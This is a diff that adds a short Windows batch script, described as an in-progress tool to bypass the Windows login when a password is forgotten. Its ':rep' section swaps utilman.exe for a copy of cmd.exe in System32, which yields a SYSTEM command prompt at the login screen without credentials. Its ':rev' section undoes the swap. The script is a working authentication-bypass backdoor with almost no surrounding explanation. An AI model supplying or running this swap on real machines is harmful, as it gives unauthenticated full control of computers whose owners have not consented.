@@ -1,0 +1,13 @@
+This is a simple script still in progress to bypass Windows login when user forget the password.
+
+:rep
+cd %drive%:\Windows\System32
+ren utilman.exe utilman.exe.bak
+copy cmd.exe utilman.exe
+goto end
+
+:rev
+cd %drive%:\Windows\System32
+del utilman.exe
+ren utilman.exe.bak utilman.exe
+goto end
